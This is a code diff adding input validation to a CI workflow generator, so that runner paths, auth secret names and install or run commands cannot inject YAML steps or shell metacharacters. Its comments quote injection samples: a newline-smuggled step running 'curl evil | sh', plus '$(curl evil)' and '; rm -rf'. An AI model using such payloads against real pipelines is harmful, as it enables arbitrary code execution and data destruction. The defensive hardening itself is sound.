@@ -58,11 +58,26 @@ export class DefaultPipelineGenerationService
     const effectiveInstall = request.settings.runner.ciInstallCommand.trim() || "npm ci";
     const effectiveRun = request.settings.runner.ciRunCommand.trim() || "npm run test:ci";
     const nodeVersion = request.settings.ci.nodeVersion.trim() || "22";
+    // The runner path is rendered into several UNQUOTED YAML scalars
+    // (working-directory, cache-dependency-path, upload path) using the same
+    // POSIX normalization the content builder applies — so it must pass the same
+    // safety screen as the commands, otherwise a value like
+    // `runner\n      - run: curl evil | sh` breaks out into extra workflow steps.
+    const runnerPath = request.settings.paths.testRunnerPath.replace(/\\/g, "/");
+    // Auth env keys are rendered as `secrets.<KEY>` (and as YAML map keys); a
+    // tampered settings blob could smuggle a newline/metachar through one.
+    const authKeys = [
+      ...new Set(
+        Object.values(request.settings.sut.environments).flatMap((e) =>
+          Object.keys(e.auth?.env ?? {}),
+        ),
+      ),
+    ];
     // Reject control characters (newlines especially) in EVERY value rendered
     // into the YAML before anything else — a multiline value would break out of
     // its `run:`/`with:` line and inject arbitrary workflow steps even though the
     // tokenized command check below (which splits on whitespace) wouldn't see it.
-    for (const value of [effectiveInstall, effectiveRun, nodeVersion]) {
+    for (const value of [effectiveInstall, effectiveRun, nodeVersion, runnerPath, ...authKeys]) {
       // eslint-disable-next-line no-control-regex
       if (/[\u0000-\u001f]/.test(value)) {
         return err(
@@ -70,6 +85,31 @@ export class DefaultPipelineGenerationService
             "VALIDATION_FAILED",
             `Configured CI value contains a control character and can't be written to the workflow: ${JSON.stringify(value)}.`,
             { details: { value } },
+          ),
+        );
+      }
+    }
+    // The runner path is a relative folder; keep it to plain path characters so
+    // it can't carry YAML syntax (`:`, `#`, quotes) or shell metacharacters into
+    // the working-directory / upload-path scalars.
+    if (!/^[A-Za-z0-9 _./-]+$/.test(runnerPath) || runnerPath.split("/").includes("..")) {
+      return err(
+        appError(
+          "VALIDATION_FAILED",
+          `Configured runner path is not a safe relative path for the workflow: ${JSON.stringify(runnerPath)}.`,
+          { details: { runnerPath } },
+        ),
+      );
+    }
+    // GitHub secret/env names (and our auth keys) are identifier-shaped; a key
+    // with any other character can't be safely rendered as `secrets.<KEY>`.
+    for (const key of authKeys) {
+      if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(key)) {
+        return err(
+          appError(
+            "VALIDATION_FAILED",
+            `Auth env key is not a valid secret name for the workflow: ${JSON.stringify(key)}.`,
+            { details: { key } },
           ),
         );
       }
@@ -86,6 +126,21 @@ export class DefaultPipelineGenerationService
       );
     }
     for (const command of [effectiveInstall, effectiveRun]) {
+      // Actions runs `run:` steps through a shell, so unlike the local spawn
+      // (shell:false) any shell metacharacter — including ones smuggled in after
+      // a `--` separator, which the argv allowlist passes through as literal test
+      // args — would execute. Screen the WHOLE command against a shell-safe
+      // charset BEFORE the argv allowlist so `npm run test:ci -- $(curl evil)`,
+      // `; rm -rf`, backticks, pipes, redirects, etc. are rejected.
+      if (!/^[A-Za-z0-9 _:./=@-]+$/.test(command)) {
+        return err(
+          appError(
+            "VALIDATION_FAILED",
+            `Configured CI command contains a character unsafe for a shell run-step: "${command}".`,
+            { details: { command } },
+          ),
+        );
+      }
       const safe = this.commandSafety.assertSafe(command.split(/\s+/).filter(Boolean));
       if (!safe.ok) {
         return err(
